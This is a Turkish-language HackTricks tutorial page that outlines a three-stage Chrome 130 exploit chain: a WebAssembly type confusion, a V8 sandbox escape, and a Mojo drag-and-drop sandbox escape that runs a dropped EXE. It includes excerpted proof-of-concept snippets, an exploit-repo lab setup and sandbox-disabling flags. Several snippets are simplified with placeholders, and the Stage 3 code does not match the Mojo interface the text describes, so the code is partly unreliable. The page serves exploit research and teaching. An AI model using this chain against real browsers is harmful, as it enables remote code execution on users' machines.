# Chrome Exploiting

{{#include ../banners/hacktricks-training.md}}

> Bu sayfa, **pratik** bir şekilde, Google Chrome 130'a karşı modern bir "tam zincir" istismar iş akışının yüksek seviyeli bir özetini sunmaktadır. Bu, **“101 Chrome Exploitation”** araştırma serisine dayanmaktadır (Bölüm-0 — Giriş). 
> Amaç, pentesterlar ve istismar geliştiricilerine, teknikleri kendi araştırmaları için yeniden üretmek veya uyarlamak için gerekli minimum arka planı sağlamaktır.

## 1. Chrome Mimarisi Özeti
Saldırı yüzeyini anlamak, kodun nerede çalıştığını ve hangi kumanda alanlarının geçerli olduğunu bilmek gerektirir.
```
+-------------------------------------------------------------------------+
|                             Chrome Browser                              |
|                                                                         |
|  +----------------------------+      +-----------------------------+    |
|  |      Renderer Process      |      |    Browser/main Process     |    |
|  |  [No direct OS access]     |      |  [OS access]                |    |
|  |  +----------------------+   |      |                             |    |
|  |  |    V8 Sandbox        |   |      |                             |    |
|  |  |  [JavaScript / Wasm] |   |      |                             |    |
|  |  +----------------------+   |      |                             |    |
|  +----------------------------+      +-----------------------------+    |
|               |           IPC/Mojo              |                       |
|               V                                    |                     |
|  +----------------------------+                   |                     |
|  |        GPU Process         |                   |                     |
|  |  [Restricted OS access]    |                   |                     |
|  +----------------------------+                   |                     |
+-------------------------------------------------------------------------+
```
Katmanlı derin savunma:

* **V8 sandbox** (İzole): bellek izinleri, JIT'lenmiş JS / Wasm'den rastgele okuma/yazmayı önlemek için kısıtlanmıştır.
* **Renderer ↔ Browser split**, **Mojo/IPC** mesaj geçişi ile sağlanır; renderer'ın *yerel* FS/ağ erişimi yoktur.
* **OS sandboxes**, her süreci daha da sınırlar (Windows Integrity Levels / `seccomp-bpf` / macOS sandbox profilleri).

Bir *uzaktan* saldırganın bu nedenle **üç** ardışık ilkeye ihtiyacı vardır:

1. V8 içinde **rastgele RW elde etmek için bellek bozulması**.
2. Saldırganın **V8 sandbox'tan tam renderer belleğine kaçmasına** izin veren ikinci bir hata.
3. **Chrome OS sandbox'ının dışındaki kodu çalıştırmak için** son bir sandbox-kaçışı (genellikle bellek bozulmasından ziyade mantık).

---

## 2. Aşama 1 – WebAssembly Tür-Karmaşası (CVE-2025-0291)

TurboFan’ın **Turboshaft** optimizasyonundaki bir hata, değerin *tek bir temel blok döngüsü* içinde üretildiği ve tüketildiği zaman **WasmGC referans türlerini** yanlış sınıflandırır.

Etkisi:
* Derleyici **tip kontrolünü atlar**, bir *referansı* (`externref/anyref`) *int64* olarak ele alır.
* Tasarlanmış Wasm, bir JS nesne başlığını saldırgan kontrolündeki verilerle örtüşmesine izin verir → <code>addrOf()</code> & <code>fakeObj()</code> **AAW / AAR ilkelere**. 

Minimal PoC (alıntı):
```WebAssembly
(module
(type $t0 (func (param externref) (result externref)))
(func $f (param $p externref) (result externref)
(local $l externref)
block $exit
loop $loop
local.get $p      ;; value with real ref-type
;; compiler incorrectly re-uses it as int64 in the same block
br_if $exit       ;; exit condition keeps us single-block
br   $loop
end
end)
(export "f" (func $f)))
```
Trigger optimizasyonu ve JS'den spray nesneleri:
```js
const wasmMod = new WebAssembly.Module(bytes);
const wasmInst = new WebAssembly.Instance(wasmMod);
const f = wasmInst.exports.f;

for (let i = 0; i < 1e5; ++i) f({});   // warm-up for JIT

// primitives
let victim   = {m: 13.37};
let fake     = arbitrary_data_backed_typedarray;
let addrVict = addrOf(victim);
```
Sonuç: **V8 içinde keyfi okuma/yazma**.

---

## 3. Aşama 2 – V8 Sandbox'tan Kaçış (sorun 379140430)

Bir Wasm fonksiyonu tier-up-compile edildiğinde, bir **JS ↔ Wasm wrapper** oluşturulur. Bir imza-uyumsuzluk hatası, Wasm fonksiyonu *yine de yığın üzerinde* yeniden optimize edilirken wrapper'ın güvenilir **`Tuple2`** nesnesinin sonunu aşarak yazmasına neden olur.

`Tuple2` nesnesinin 2 × 64-bit alanını geçersiz kılmak, **Renderer sürecindeki herhangi bir adreste okuma/yazma** sağlar ve böylece V8 sandbox'ını etkili bir şekilde atlatır.

Saldırıdaki ana adımlar:
1. Fonksiyonu **Tier-Up** durumuna getirmek için turbofan/baseline kodunu sırayla kullanın.
2. Yığın üzerinde bir referans tutarak tier-up'ı tetikleyin (`Function.prototype.apply`).
3. Yanındaki `Tuple2`'yi bulmak ve bozulmasına neden olmak için Aşama-1 AAR/AAW kullanın.

Wrapper tanımlaması:
```js
function wrapperGen(arg) {
return f(arg);
}
%WasmTierUpFunction(f);          // force tier-up (internals-only flag)
wrapperGen(0x1337n);
```
Kötüye kullanım sonrası tam özellikli **renderer R/W primitive**'ine sahibiz.

---

## 4. Aşama 3 – Renderer → OS Sandbox Kaçışı (CVE-2024-11114)

**Mojo** IPC arayüzü `blink.mojom.DragService.startDragging()` *kısmen güvenilir* parametrelerle Renderer'dan çağrılabilir. **Rastgele bir dosya yolu** gösteren bir `DragData` yapısı oluşturarak, renderer tarayıcıyı **renderer sandbox'ı dışındaki** bir *yerel* sürükle-bırak işlemi gerçekleştirmeye ikna eder.

Bunu kötüye kullanarak, programatik olarak kötü niyetli bir EXE'yi (önceden yazılabilir bir konuma bırakılmış) Masaüstü'ne “sürükleyebiliriz”, burada Windows belirli dosya türlerini bırakıldığında otomatik olarak çalıştırır.

Örnek (basitleştirilmiş):
```js
const payloadPath = "C:\\Users\\Public\\explorer.exe";

chrome.webview.postMessage({
type: "DragStart",
data: {
title: "MyFile",
file_path: payloadPath,
mime_type: "application/x-msdownload"
}
});
```
No additional memory corruption is necessary – the **logic flaw** gives us arbitrary file execution with the user’s privileges.

---

## 5. Tam Zincir Akışı

1. **Kullanıcı kötü niyetli** web sayfasını ziyaret eder.
2. **Aşama 1**: Wasm modülü CVE-2025-0291'i kötüye kullanır → V8 yığını AAR/AAW.
3. **Aşama 2**: Wrapper uyumsuzluğu `Tuple2`'yi bozar → V8 kumandasından kaçış.
4. **Aşama 3**: `startDragging()` IPC → OS kumandasından kaçış & yükü çalıştır.

Sonuç: **Uzaktan Kod Çalıştırma (RCE)** ana makinede (Chrome 130, Windows/Linux/macOS).

---

## 6. Laboratuvar & Hata Ayıklama Kurulumu
```bash
# Spin-up local HTTP server w/ PoCs
npm i -g http-server
git clone https://github.com/Petitoto/chromium-exploit-dev
cd chromium-exploit-dev
http-server -p 8000 -c -1

# Windows kernel debugging
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbgx.exe" -symbolpath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
```
Chrome'un *geliştirme* sürümünü başlatırken yararlı bayraklar:
```bash
chrome.exe --no-sandbox --disable-gpu --single-process --js-flags="--allow-natives-syntax"
```
---

## Alınacak Dersler

* **WebAssembly JIT hataları** güvenilir bir giriş noktası olmaya devam ediyor – tip sistemi hala genç.
* V8 içinde ikinci bir bellek bozulma hatası elde etmek (örneğin, sarmalayıcı uyumsuzluğu) **V8-sandbox kaçışı** büyük ölçüde basitleştirir.
* Ayrıcalıklı Mojo IPC arayüzlerindeki mantık seviyesi zayıflıkları genellikle **son sandbox kaçışı** için yeterlidir – *bellek dışı* hatalara dikkat edin.



## Referanslar
* [101 Chrome Exploitation — Part 0 (Önsöz)](https://opzero.ru/en/press/101-chrome-exploitation-part-0-preface/)
* [Chromium güvenlik mimarisi](https://chromium.org/developers/design-documents/security)
{{#include ../banners/hacktricks-training.md}}
